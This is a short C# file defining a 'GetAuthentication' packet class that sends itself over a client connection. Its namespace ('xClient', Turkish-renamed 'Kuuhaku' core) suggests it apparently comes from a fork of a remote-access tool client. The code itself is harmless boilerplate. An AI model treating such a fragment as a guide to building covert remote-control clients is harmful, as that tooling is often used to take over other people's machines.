using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetAuthentication : IPacket
    {
        public GetAuthentication()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}